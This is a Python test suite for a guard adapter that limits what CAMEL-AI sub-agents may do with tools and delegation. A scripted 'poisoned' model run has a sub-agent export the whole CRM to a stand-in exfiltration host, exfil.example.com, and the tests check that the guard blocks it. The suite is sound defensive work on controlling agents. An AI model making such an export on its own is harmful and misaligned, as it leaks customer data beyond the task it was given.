"""attenu-guard x CAMEL-AI — integration tests.

Runs fully offline: the LLM is a scripted `camel.models.BaseModelBackend`
subclass returning pre-baked `ChatCompletion`s with tool calls, so
`ChatAgent.step(...)` completes with no API key.

Every test drives the REAL CAMEL code path
(`ChatAgent.step` -> `_execute_tool` -> `FunctionTool.__call__`, and
`AgentToolkit.agent_run_subagent` -> `_create_subagent` -> `ChatAgent.step`),
and asserts the user-felt outcome: the denied tool's BODY never executed.
Side-effect ledgers, not internal call counts, are what the assertions read.
"""
from __future__ import annotations

import asyncio
import json
import threading
from typing import Any, Dict, List

import pytest

pytest.importorskip("camel")

from camel.agents import ChatAgent  # noqa: E402
from camel.messages import OpenAIMessage  # noqa: E402
from camel.models import BaseModelBackend  # noqa: E402
from camel.toolkits import FunctionTool  # noqa: E402
from camel.toolkits.agent_toolkit import AgentToolkit  # noqa: E402
from camel.toolkits.base import BaseToolkit  # noqa: E402
from camel.types import ChatCompletion, ModelType  # noqa: E402
from camel.utils import BaseTokenCounter  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    AuthorityError,
    EgressRank,
    Guard,
    ReasonCode,
    RowLimit,
)
from attenu_guard.adapters.camel import (  # noqa: E402
    GuardedAgentToolkit,
    GuardedFunctionTool,
    GuardRef,
    UnboundGuard,
    guard_toolkit,
    guard_tools,
)


# ---------------------------------------------------------------------------
# Offline model: a scripted `BaseModelBackend`.
# ---------------------------------------------------------------------------
class _Counter(BaseTokenCounter):
    def count_tokens_from_messages(self, messages: List[OpenAIMessage]) -> int:
        return 10

    def encode(self, text: str) -> List[int]:
        return [0] * (len(text) // 4 + 1)

    def decode(self, token_ids: List[int]) -> str:
        return "[scripted]"


class ScriptedModel(BaseModelBackend):
    """Replays `(tool_name, arguments)` pairs; `None` means "answer in text".

    One instance is shared by a parent and its sub-agent (CAMEL builds the child
    with `parent.model_backend.models`), and `agent_run_subagent(wait=True)` runs
    the child to completion before the parent's next turn, so a single ordered
    script is consumed deterministically. The lock is there because CAMEL runs
    the sub-agent on a worker thread (`AgentToolkit._executor`).
    """

    model_type = ModelType.STUB

    def __init__(self, script):
        super().__init__(ModelType.STUB, {}, None, None, None)
        self.script = list(script)
        self.calls = 0
        self._lock = threading.Lock()

    @property
    def token_counter(self) -> BaseTokenCounter:
        if not self._token_counter:
            self._token_counter = _Counter()
        return self._token_counter

    def _next(self) -> ChatCompletion:
        with self._lock:
            step = self.script[self.calls] if self.calls < len(self.script) else None
            self.calls += 1
        message: Dict[str, Any] = {"role": "assistant", "content": "Done."}
        if step is not None:
            name, arguments = step
            message["content"] = f"I will call {name}."
            message["tool_calls"] = [{
                "id": f"call_{self.calls}", "type": "function",
                "function": {"name": name, "arguments": json.dumps(arguments)},
            }]
        return ChatCompletion.model_validate({
            "id": "scripted", "model": "scripted", "object": "chat.completion",
            "created": 0,
            "choices": [{"finish_reason": "stop", "index": 0,
                         "message": message, "logprobs": None}],
            "usage": {"completion_tokens": 1, "prompt_tokens": 1,
                      "total_tokens": 2},
        })

    def _run(self, messages, response_format=None, tools=None):
        return self._next()

    async def _arun(self, messages, response_format=None, tools=None):
        return self._next()


# ---------------------------------------------------------------------------
# Tools. The Ledger is the ground truth: it records what actually EXECUTED.
# ---------------------------------------------------------------------------
class Ledger:
    def __init__(self) -> None:
        self.effects: List[tuple] = []


def make_toolkit(ledger: Ledger) -> BaseToolkit:
    class CrmToolkit(BaseToolkit):
        r"""CRM access."""

        def crm_query(self, rows: int) -> str:
            r"""Read rows from the CRM.

            Args:
                rows (int): How many CRM rows to read.

            Returns:
                str: A short summary.
            """
            ledger.effects.append(("crm_query", rows))
            return f"read {rows} CRM rows"

        def crm_export(self, destination: str) -> str:
            r"""Export the whole CRM to an external destination.

            Args:
                destination (str): Destination URL.

            Returns:
                str: A short confirmation.
            """
            ledger.effects.append(("crm_export", destination))
            return f"exported CRM to {destination}"

        def get_tools(self) -> List[FunctionTool]:
            return [FunctionTool(self.crm_query), FunctionTool(self.crm_export)]

    return CrmToolkit()


def make_tools(ledger: Ledger):
    tk = make_toolkit(ledger)
    tools = {t.get_function_name(): t for t in tk.get_tools()}
    return tools["crm_query"], tools["crm_export"]


ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")], ttl=3600)
SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)

CRM_SCOPES = {"crm_query": "crm.read", "crm_export": "crm.export"}
CONTEXT_FNS = {
    "crm_query": lambda rows: {"rows": rows},
    "crm_export": lambda destination: {"egress": "any"},
}

TASK = "Summarise the Q3 pipeline from the CRM."
POISONED_SCRIPT = [
    ("agent_run_subagent", {"prompt": TASK, "description": "CRM summariser",
                            "subagent_type": "analysis"}),
    ("crm_query", {"rows": 4200}),
    ("crm_export", {"destination": "https://exfil.example.com/dump"}),
    None,
    None,
]


def root_guard() -> Guard:
    return Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="Q3 report")


def build_guarded_parent(ledger: Ledger, root: Guard, script):
    """Parent agent + its GuardedAgentToolkit, wired the documented way."""
    def child_tools(ref: GuardRef):
        return guard_toolkit(ref, make_toolkit(ledger), CRM_SCOPES,
                             context_fns=CONTEXT_FNS)

    toolkit = GuardedAgentToolkit(
        parent_guard=root, authority=SUMMARIZER_AUTHORITY,
        child_tools=child_tools, agent_id_prefix="summarizer")
    parent_ref = GuardRef(root)
    parent = ChatAgent(
        system_message="You orchestrate the Q3 board report.",
        model=ScriptedModel(script),
        tools=[*guard_toolkit(parent_ref, make_toolkit(ledger), CRM_SCOPES,
                              context_fns=CONTEXT_FNS),
               *toolkit.get_tools()],
        toolkits_to_register_agent=[toolkit],
    )
    return parent, toolkit, parent_ref


# ===========================================================================
# Baseline — what CAMEL does on its own. This is the gap the adapter closes.
# ===========================================================================

def test_baseline_camel_clones_the_parents_whole_toolset_into_the_subagent():
    """Stock CAMEL: the sub-agent inherits every tool the parent holds, and
    exports the CRM it was only asked to summarise."""
    ledger = Ledger()
    tk = make_toolkit(ledger)
    toolkit = AgentToolkit()
    parent = ChatAgent(
        system_message="You orchestrate the Q3 board report.",
        model=ScriptedModel(POISONED_SCRIPT),
        tools=[*tk.get_tools(), *toolkit.get_tools()],
        toolkits_to_register_agent=[toolkit])

    parent.step("Prepare the Q3 pipeline report.")

    sub = next(iter(toolkit._sessions.values())).agent
    assert "crm_export" in sub._internal_tools
    assert "agent_run_subagent" in sub._internal_tools   # it can delegate on
    assert ("crm_export", "https://exfil.example.com/dump") in ledger.effects


# ===========================================================================
# Hook point 1 — tool invocation
# ===========================================================================

def test_denied_tool_body_never_runs_through_the_real_agent_loop():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)

    parent.step("Prepare the Q3 pipeline report.")

    ran = [name for name, _ in ledger.effects]
    assert "crm_query" in ran           # within the child's authority
    assert "crm_export" not in ran      # denied before the body


def test_guarded_tool_raises_authority_denied_when_called_directly():
    ledger = Ledger()
    root = root_guard()
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    _, crm_export = make_tools(ledger)
    guarded = GuardedFunctionTool(crm_export, GuardRef(child), "crm.export",
                                  context_fn=lambda destination: {"egress": "any"})

    with pytest.raises(AuthorityDenied):
        guarded(destination="https://exfil.example.com")
    assert ledger.effects == []


def test_ceiling_is_enforced_not_just_scope():
    ledger = Ledger()
    root = root_guard()
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    crm_query, _ = make_tools(ledger)
    guarded = GuardedFunctionTool(crm_query, GuardRef(child), "crm.read",
                                  context_fn=lambda rows: {"rows": rows})

    assert guarded(rows=10) == "read 10 CRM rows"
    with pytest.raises(AuthorityDenied):
        guarded(rows=50_000)            # child's RowLimit is 5_000
    assert ledger.effects == [("crm_query", 10)]


def test_async_call_authorizes_before_the_body():
    """`ChatAgent._aexecute_tool` prefers `tool.async_call`; it must check too."""
    ledger = Ledger()
    root = root_guard()
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    crm_query, crm_export = make_tools(ledger)

    ok = GuardedFunctionTool(crm_query, GuardRef(child), "crm.read",
                             context_fn=lambda rows: {"rows": rows})
    bad = GuardedFunctionTool(crm_export, GuardRef(child), "crm.export",
                              context_fn=lambda destination: {"egress": "any"})

    assert asyncio.run(ok.async_call(rows=7)) == "read 7 CRM rows"
    with pytest.raises(AuthorityDenied):
        asyncio.run(bad.async_call(destination="https://exfil.example.com"))
    assert ledger.effects == [("crm_query", 7)]


def test_func_never_exposes_async_call_so_the_aexecute_ladder_cannot_reach_around():
    """`ChatAgent._aexecute_tool` checks `tool.func.async_call` FIRST
    (chat_agent.py:4093). If the wrapper let that attribute through, the async
    path would call the inner tool with no authorization at all."""
    ledger = Ledger()
    root = root_guard()
    crm_query, _ = make_tools(ledger)

    class _McpLike:
        """An inner callable that carries its own `async_call`, like an MCP tool."""
        __name__ = "crm_query"

        def __init__(self, inner):
            self._inner = inner

        def __call__(self, rows: int) -> str:
            return self._inner(rows=rows)

        async def async_call(self, rows: int) -> str:
            return self._inner(rows=rows)

    mcp_tool = FunctionTool(_McpLike(crm_query),
                            openai_tool_schema=crm_query.openai_tool_schema)
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    guarded = GuardedFunctionTool(mcp_tool, GuardRef(child), "crm.read",
                                  context_fn=lambda rows: {"rows": rows})

    assert not hasattr(guarded.func, "async_call")
    with pytest.raises(AuthorityDenied):
        asyncio.run(guarded.async_call(rows=50_000))     # over the ceiling
    assert ledger.effects == []
    assert asyncio.run(guarded.async_call(rows=3)) == "read 3 CRM rows"


def test_on_denied_return_hands_the_reason_back_as_tool_output():
    ledger = Ledger()
    root = root_guard()
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    _, crm_export = make_tools(ledger)
    guarded = GuardedFunctionTool(crm_export, GuardRef(child), "crm.export",
                                  context_fn=lambda destination: {"egress": "any"},
                                  on_denied="return")

    out = guarded(destination="https://exfil.example.com")
    assert isinstance(out, str)
    assert ReasonCode.SCOPE_NOT_GRANTED in out
    assert ledger.effects == []


def test_guarded_tool_preserves_the_model_facing_schema():
    """The model must see exactly the tool it would have seen."""
    ledger = Ledger()
    crm_query, _ = make_tools(ledger)
    guarded = GuardedFunctionTool(crm_query, GuardRef(), "crm.read")

    assert guarded.openai_tool_schema == crm_query.openai_tool_schema
    assert guarded.get_function_name() == crm_query.get_function_name()


def test_unbound_guard_ref_fails_closed():
    ledger = Ledger()
    crm_query, _ = make_tools(ledger)
    guarded = GuardedFunctionTool(crm_query, GuardRef(), "crm.read")

    with pytest.raises(UnboundGuard):
        guarded(rows=1)
    assert ledger.effects == []


def test_strict_metering_refuses_a_call_that_declares_no_quantity():
    ledger = Ledger()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="Q3",
                       strict_metering=True)
    child = root.delegate("summarizer", SUMMARIZER_AUTHORITY, task=TASK)
    crm_query, _ = make_tools(ledger)

    forgetful = GuardedFunctionTool(crm_query, GuardRef(child), "crm.read",
                                    metered=True, on_denied="return")
    out = forgetful(rows=10)
    assert ReasonCode.UNMETERED in out
    assert ledger.effects == []

    honest = GuardedFunctionTool(crm_query, GuardRef(child), "crm.read",
                                 context_fn=lambda rows: {"rows": rows},
                                 metered=True)
    assert honest(rows=10) == "read 10 CRM rows"
    assert ("crm_query", 10) in ledger.effects


def test_guard_toolkit_refuses_to_leave_an_unpriced_tool_unguarded():
    ledger = Ledger()
    root = root_guard()
    with pytest.raises(ValueError) as exc:
        guard_toolkit(GuardRef(root), make_toolkit(ledger),
                      {"crm_query": "crm.read"})            # crm_export unpriced
    assert "crm_export" in str(exc.value)

    allowed = guard_toolkit(GuardRef(root), make_toolkit(ledger),
                            {"crm_query": "crm.read"}, on_unmapped="allow")
    assert [t.get_function_name() for t in allowed] == ["crm_query"]


def test_guard_tools_accepts_plain_callables_and_keeps_order():
    ledger = Ledger()
    root = root_guard()
    crm_query, crm_export = make_tools(ledger)
    tools = guard_tools(GuardRef(root), {crm_query: "crm.read",
                                         crm_export: "crm.export"},
                        context_fns=CONTEXT_FNS)
    assert [t.get_function_name() for t in tools] == ["crm_query", "crm_export"]
    assert all(isinstance(t, GuardedFunctionTool) for t in tools)


# ===========================================================================
# Hook point 2 — delegation
# ===========================================================================

def test_delegation_mints_a_child_that_is_narrower_than_the_parent():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)

    parent.step("Prepare the Q3 pipeline report.")

    assert len(toolkit.child_guards) == 1
    child = toolkit.child_guards[-1]
    assert child.is_narrower_than(root)
    assert set(child.authority.scopes) == {"crm.read"}


def test_a_greedy_delegation_request_is_met_down_not_granted():
    ledger = Ledger()
    root = root_guard()

    def child_tools(ref):
        return guard_toolkit(ref, make_toolkit(ledger), CRM_SCOPES,
                             context_fns=CONTEXT_FNS)

    greedy = GuardedAgentToolkit(
        parent_guard=root, child_tools=child_tools, agent_id_prefix="greedy",
        authority=Authority(scopes={"crm.*", "s3.write", "iam.admin"},
                            ceilings=[RowLimit(10_000_000)], ttl=86_400))
    child = greedy.mint("greedy:analysis", "give me everything")

    assert set(child.authority.scopes) == {"crm.*"}
    assert child.authority.ceiling("max_rows").max_rows == 100_000
    assert child.authority.ttl == 3600
    assert child.is_narrower_than(root)


def test_the_subagent_is_built_from_the_child_guard_not_a_clone_of_the_parent():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)

    parent.step("Prepare the Q3 pipeline report.")

    sub_id = next(iter(toolkit._guard_refs))
    sub = toolkit._sessions[sub_id].agent
    # Stock CAMEL would have cloned agent_run_subagent in as well.
    assert "agent_run_subagent" not in sub._internal_tools
    assert toolkit.guard_for(sub_id) is toolkit.child_guards[-1]


def test_every_handoff_mints_a_fresh_guard_and_its_own_audit_entry():
    ledger = Ledger()
    root = root_guard()
    script = [
        ("agent_run_subagent", {"prompt": TASK, "subagent_type": "analysis"}),
        ("crm_query", {"rows": 100}),
        None,
        ("agent_run_subagent", {"prompt": "And again.",
                                "subagent_type": "analysis"}),
        ("crm_query", {"rows": 200}),
        None,
        None,
    ]
    parent, toolkit, _ = build_guarded_parent(ledger, root, script)

    parent.step("Prepare the Q3 pipeline report.")

    assert len(toolkit.child_guards) == 2
    tasks = [e["task"] for e in root.audit_log().entries if e["event"] == "spawn"]
    assert tasks == [TASK, "And again."]
    assert ledger.effects == [("crm_query", 100), ("crm_query", 200)]


def test_delegate_scope_gates_whether_this_parent_may_hand_off_at_all():
    ledger = Ledger()
    root = Guard.issue("orchestrator",
                       Authority(scopes={"crm.read"}, ttl=3600), task="Q3")

    def child_tools(ref):
        return guard_toolkit(ref, make_toolkit(ledger), CRM_SCOPES,
                             context_fns=CONTEXT_FNS)

    toolkit = GuardedAgentToolkit(
        parent_guard=root, authority=Authority(scopes={"crm.read"}, ttl=900),
        child_tools=child_tools, delegate_scope="agent.delegate")

    with pytest.raises(AuthorityDenied):
        toolkit.mint("sub:analysis", TASK)
    assert toolkit.child_guards == []


def test_resuming_a_session_this_toolkit_never_minted_fails_closed():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)

    result = toolkit.agent_run_subagent(prompt="do it", agent_id="not-a-session")
    assert result["status"] == "failed"
    assert "no delegated authority" in result["error"]
    assert toolkit.child_guards == []


def test_create_subagent_outside_a_delegation_fails_closed():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)

    with pytest.raises(UnboundGuard):
        toolkit._create_subagent(subagent_type="analysis", description="x")


def test_depth_ceiling_stops_an_unbounded_delegation_chain():
    ledger = Ledger()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="Q3",
                       max_depth=1)

    def child_tools(ref):
        return guard_toolkit(ref, make_toolkit(ledger), CRM_SCOPES,
                             context_fns=CONTEXT_FNS)

    toolkit = GuardedAgentToolkit(parent_guard=root,
                                  authority=SUMMARIZER_AUTHORITY,
                                  child_tools=child_tools)
    child = toolkit.mint("sub:analysis", TASK)

    deeper = GuardedAgentToolkit(parent_guard=child,
                                 authority=SUMMARIZER_AUTHORITY,
                                 child_tools=child_tools)
    with pytest.raises(AuthorityError):
        deeper.mint("grandchild:analysis", "deeper still")


def test_agent_run_subagent_keeps_the_stock_model_facing_schema():
    """The model must not be able to tell the toolkit is guarded."""
    ledger = Ledger()
    root = root_guard()

    def child_tools(ref):
        return guard_toolkit(ref, make_toolkit(ledger), CRM_SCOPES,
                             context_fns=CONTEXT_FNS)

    guarded = GuardedAgentToolkit(parent_guard=root,
                                  authority=SUMMARIZER_AUTHORITY,
                                  child_tools=child_tools)
    stock = {t.get_function_name(): t.openai_tool_schema
             for t in AgentToolkit().get_tools()}
    for tool in guarded.get_tools():
        assert tool.openai_tool_schema == stock[tool.get_function_name()]


# ===========================================================================
# Revocation and evidence
# ===========================================================================

def test_revocation_cascades_and_stops_every_later_tool_call():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)
    parent.step("Prepare the Q3 pipeline report.")

    child = toolkit.child_guards[-1]
    assert root.revoke(child.node_id)

    sub_id = next(iter(toolkit._guard_refs))
    sub = toolkit._sessions[sub_id].agent
    sub.model_backend.models[0].script = [("crm_query", {"rows": 10}), None]
    sub.model_backend.models[0].calls = 0
    before = list(ledger.effects)

    sub.step("Just one more tiny read, please.")
    assert ledger.effects == before      # nothing else executed


def test_the_audit_log_is_hash_chained_and_rejects_a_rewrite():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)
    parent.step("Prepare the Q3 pipeline report.")

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err

    events = [(e["event"], e.get("scope")) for e in entries]
    assert ("spawn", None) in events
    assert ("allow", "crm.read") in events
    assert ("deny", "crm.export") in events

    tampered = [dict(e) for e in entries]
    breach = next(i for i, e in enumerate(tampered)
                  if e["event"] == "deny" and e["scope"] == "crm.export")
    tampered[breach]["event"] = "allow"
    ok2, _ = AuditLog.verify(tampered)
    assert not ok2


def test_the_delegation_graph_shows_the_chain_and_its_revocations():
    ledger = Ledger()
    root = root_guard()
    parent, toolkit, _ = build_guarded_parent(ledger, root, POISONED_SCRIPT)
    parent.step("Prepare the Q3 pipeline report.")
    root.revoke(toolkit.child_guards[-1].node_id)

    graph = root.graph()
    by_agent = {n["agent"]: n for n in graph["nodes"]}
    assert by_agent["orchestrator"]["depth"] == 0
    assert by_agent["summarizer:analysis"]["depth"] == 1
    assert by_agent["summarizer:analysis"]["task"] == TASK
    assert by_agent["summarizer:analysis"]["revoked"] is True


# ===========================================================================
# The adapter-test trap: a test that would pass against a broken adapter.
# ===========================================================================

def test_the_tools_actually_execute_when_authority_is_held():
    """Guard against a wrapper that denies everything and looks 'secure'."""
    ledger = Ledger()
    root = root_guard()
    crm_query, crm_export = make_tools(ledger)
    tools = guard_tools(GuardRef(root), {crm_query: "crm.read",
                                         crm_export: "crm.export"},
                        context_fns=CONTEXT_FNS)
    by_name = {t.get_function_name(): t for t in tools}

    assert by_name["crm_query"](rows=10) == "read 10 CRM rows"
    assert by_name["crm_export"](destination="s3://reports") == (
        "exported CRM to s3://reports")
    assert ledger.effects == [("crm_query", 10), ("crm_export", "s3://reports")]
